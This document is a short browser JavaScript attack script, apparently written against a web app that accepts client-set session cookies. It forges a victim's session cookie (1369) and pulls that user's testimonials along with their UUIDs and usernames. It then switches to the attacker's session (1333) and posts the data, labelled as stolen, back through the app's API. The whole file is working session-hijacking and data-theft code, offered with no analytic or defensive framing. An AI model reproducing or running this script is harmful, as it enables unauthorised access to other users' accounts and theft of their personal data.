(async function stealAndPostVictimData() {
    
    console.log("🚀 Fetching victim data from session 1369...");

    // Force Victim Session
    document.cookie = "session=1369; path=/";
    await new Promise(r => setTimeout(r, 500));

    let victimTestimonials = [];

    try {
        const res = await fetch('/api/testimonials', {
            method: 'GET',
            credentials: 'include'
        });

        if (res.ok) {
            victimTestimonials = await res.json();
        }
    } catch (e) {
        console.error("Fetch failed", e);
    }

    // Format all victim data nicely
    let victimFormatted = "";

    if (Array.isArray(victimTestimonials) && victimTestimonials.length > 0) {
        victimFormatted = victimTestimonials.map((item, index) => {
            return `=== VICTIM TESTIMONIAL ${index + 1} ===\n` +
                   `UUID     : ${item.uuid || "N/A"}\n` +
                   `Content  : ${item.content || item}\n` +
                   `Timestamp: ${item.timestamp || "N/A"}\n` +
                   `Username : ${item.username || "N/A"}\n` +
                   `User Name: ${item.user_name || "N/A"}\n`;
        }).join("\n\n");
    } else if (victimTestimonials) {
        // Single object case
        const item = victimTestimonials;
        victimFormatted = `=== VICTIM TESTIMONIAL ===\n` +
                         `UUID     : ${item.uuid || "N/A"}\n` +
                         `Content  : ${item.content || item}\n` +
                         `Timestamp: ${item.timestamp || "N/A"}\n` +
                         `Username : ${item.username || "N/A"}\n` +
                         `User Name: ${item.user_name || "N/A"}\n`;
    }

    const finalContent = `🚨 STOLEN TESTIMONIALS FROM VICTIM\n\n` + 
                        victimFormatted + 
                        `\n\n=== END OF VICTIM DATA ===`;

    console.log("\n📋 Final Content that will be posted to 1333:\n");
    console.log(finalContent);

    // ====================== POST TO ATTACKER (1333) ======================
    document.cookie = "session=1333; path=/";
    await new Promise(r => setTimeout(r, 600));

    console.log("📤 Posting victim data to session=1333...");

    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: finalContent 
        })
    })
    .then(r => r.text())
    .then(text => console.log("✅ Posted Successfully | Status:", "OK"))
    .catch(err => console.error("POST Error:", err));

    console.log("🎯 All victim testimonials transferred to your session (1333)");

})();
